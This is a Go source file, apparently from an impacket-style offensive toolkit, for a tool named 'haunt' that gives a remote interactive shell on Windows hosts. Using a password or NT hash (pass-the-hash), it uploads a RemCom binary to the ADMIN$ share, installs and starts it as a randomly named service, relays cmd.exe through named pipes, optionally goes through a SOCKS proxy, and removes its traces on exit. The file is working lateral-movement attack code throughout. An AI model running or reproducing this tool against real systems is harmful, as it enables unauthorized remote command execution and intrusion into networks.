// haunt — remote interactive shell via named-pipe service (RemCom-style).
// Requires an external RemCom binary supplied via -file; haunt uploads it,
// registers it as a service, connects to its named pipes for stdin/stdout/stderr,
// and removes everything on exit.
package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"github.com/go-impacket/kit/internal/cred"
	"github.com/go-impacket/kit/internal/dcerpc"
	"github.com/go-impacket/kit/internal/transport"
	"github.com/go-impacket/kit/pkg/randname"
	"github.com/jfjallid/go-smb/smb"
	"golang.org/x/term"
)

// remcomMsg mirrors the RemCom wire format (little-endian, fixed-width fields).
type remcomMsg struct {
	Command    [4096]byte
	WorkingDir [260]byte
	Priority   uint32
	ProcessID  uint32
	Machine    [260]byte
	NoWait     uint32
}

func marshalRemcomMsg(cmd, workDir, machine string, pid uint32) []byte {
	var m remcomMsg
	copy(m.Command[:], cmd)
	copy(m.WorkingDir[:], workDir)
	m.Priority = 0x20
	m.ProcessID = pid
	copy(m.Machine[:], machine)

	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, m)
	return buf.Bytes()
}

func main() {
	target := flag.String("t", "", "[[domain/]user[:pass]@]host")
	hashes := flag.String("H", "", "LMHASH:NTHASH")
	remcomBin := flag.String("file", "", "path to RemCom binary to upload")
	execCmd := flag.String("cmd", "", "command to run (interactive shell if empty)")
	workDir := flag.String("path", "C:\\", "working directory for the command")
	port := flag.Int("port", 445, "SMB port")
	svcName   := flag.String("svc", "", "service name (random if empty)")
	debug     := flag.Bool("debug", false, "verbose")
	proxyAddr := flag.String("proxy", "", "SOCKS5 proxy socks5://host:port")
	flag.Parse()

	_ = debug

	if *target == "" {
		flag.Usage()
		os.Exit(1)
	}

	if *remcomBin == "" {
		fmt.Fprintln(os.Stderr, "[-] haunt requires a RemCom binary via -file <remcom.exe>")
		fmt.Fprintln(os.Stderr, "    Download from: https://github.com/kavika13/RemCom/releases")
		os.Exit(1)
	}

	domain, user, pass, host, err := cred.ParseTarget(*target)
	if err != nil {
		fatal("parse target: %v", err)
	}

	bundle := &cred.Bundle{Username: user, Password: pass, Domain: domain, ProxyURL: *proxyAddr}
	if *hashes != "" {
		_, nt, err := cred.FromHashes(*hashes)
		if err != nil {
			fatal("parse hashes: %v", err)
		}
		bundle.NTHash = nt
		bundle.Password = ""
	}

	ep, err := transport.Dial(host, *port, bundle)
	if err != nil {
		fatal("connect: %v", err)
	}
	defer ep.Close()

	conn := ep.Raw()

	svc := *svcName
	if svc == "" {
		svc = randname.Alpha(8)
	}
	remoteName := svc + ".exe"

	if err := uploadRemcom(conn, *remcomBin, remoteName); err != nil {
		fatal("upload RemCom binary: %v", err)
	}
	defer cleanupRemcom(conn, remoteName)

	sc, err := dcerpc.AttachSCMR(conn)
	if err != nil {
		fatal("SCM: %v", err)
	}
	defer func() {
		sc.Erase(svc)
		sc.Close()
	}()

	binPath := "C:\\" + remoteName
	if err := sc.Ignite(svc, binPath); err != nil {
		fatal("install service: %v", err)
	}

	time.Sleep(1 * time.Second)

	machine := randname.Alpha(4)
	pid := uint32(os.Getpid())

	commPipe := `\RemCom_communicaton`
	pipeConn, err := openRemcomPipe(conn, commPipe)
	if err != nil {
		fatal("open comm pipe: %v", err)
	}

	cmd := *execCmd
	if cmd == "" {
		cmd = "cmd.exe"
	}

	msg := marshalRemcomMsg(cmd, *workDir, machine, pid)
	if _, err := pipeConn.Write(msg); err != nil {
		fatal("send RemCom message: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	stdoutPipe := fmt.Sprintf(`\RemCom_stdout%s%d`, machine, pid)
	stderrPipe := fmt.Sprintf(`\RemCom_stderr%s%d`, machine, pid)
	stdinPipe := fmt.Sprintf(`\RemCom_stdin%s%d`, machine, pid)

	time.Sleep(500 * time.Millisecond)

	outConn, err := openRemcomPipe(conn, stdoutPipe)
	if err != nil {
		fatal("open stdout pipe: %v", err)
	}
	errConn, err := openRemcomPipe(conn, stderrPipe)
	if err != nil {
		fatal("open stderr pipe: %v", err)
	}
	inConn, err := openRemcomPipe(conn, stdinPipe)
	if err != nil {
		fatal("open stdin pipe: %v", err)
	}

	go func() { io.Copy(os.Stdout, outConn) }()
	go func() { io.Copy(os.Stderr, errConn) }()

	if *execCmd != "" {
		go func() {
			resp := make([]byte, 8)
			pipeConn.Read(resp)
			cancel()
		}()
		<-ctx.Done()
	} else {
		if term.IsTerminal(int(os.Stdin.Fd())) {
			old, err := term.MakeRaw(int(os.Stdin.Fd()))
			if err == nil {
				defer term.Restore(int(os.Stdin.Fd()), old)
			}
		}
		go func() { io.Copy(inConn, os.Stdin) }()

		resp := make([]byte, 8)
		pipeConn.Read(resp)
	}

	log.Printf("[haunt] session ended")
}

func uploadRemcom(conn *smb.Connection, localPath, remoteName string) error {
	f, err := os.Open(localPath)
	if err != nil {
		return fmt.Errorf("open %s: %w", localPath, err)
	}
	defer f.Close()

	if err := conn.TreeConnect("ADMIN$"); err != nil {
		return fmt.Errorf("ADMIN$ connect: %w", err)
	}

	return conn.PutFile("ADMIN$", remoteName, 0, func(b []byte) (int, error) {
		return f.Read(b)
	})
}

func cleanupRemcom(conn *smb.Connection, remoteName string) {
	_ = conn.DeleteFile("ADMIN$", remoteName)
	_ = conn.TreeDisconnect("ADMIN$")
}

type simplePipe struct {
	f *smb.File
}

func (p *simplePipe) Read(b []byte) (int, error)  { return p.f.ReadFile(b, 0) }
func (p *simplePipe) Write(b []byte) (int, error) { return p.f.WriteFile(b, 0) }

func openRemcomPipe(conn *smb.Connection, pipePath string) (*simplePipe, error) {
	if err := conn.TreeConnect("IPC$"); err != nil {
		return nil, fmt.Errorf("IPC$ connect: %w", err)
	}

	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskGenericRead | smb.FAccMaskGenericWrite | smb.FAccMaskSynchronize
	opts.ShareAccess = smb.FileShareRead | smb.FileShareWrite
	opts.CreateDisp = smb.FileOpen

	deadline := time.Now().Add(30 * time.Second)
	var f *smb.File
	var err error
	for time.Now().Before(deadline) {
		f, err = conn.OpenFileExt("IPC$", strings.TrimPrefix(pipePath, `\`), opts)
		if err == nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if err != nil {
		return nil, fmt.Errorf("open pipe %q: %w", pipePath, err)
	}
	return &simplePipe{f: f}, nil
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[-] "+format+"\n", args...)
	os.Exit(1)
}
